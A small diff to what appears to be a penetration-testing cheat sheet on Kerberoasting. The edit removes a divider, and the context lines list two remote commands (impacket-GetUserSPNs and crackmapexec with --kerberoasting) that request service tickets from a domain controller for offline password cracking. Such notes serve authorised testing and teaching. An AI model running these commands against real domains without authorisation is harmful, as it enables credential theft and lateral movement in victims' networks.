@@ -4,8 +4,6 @@ You have a name and a secret (password, hash, ticket, aeskey)? Kerberoasting tak
 Requirements:
 * User with creds
 
----
-
 ## Remote
 `impacket-GetUserSPNs -dc-ip <IP> <DOMAIN>/<USER>:<PASS> -request`
 `crackmapexec ldap <IP> --kdcHost <IP> -u <USER> -p <PASS> --kerberoasting <OUTPUT>`
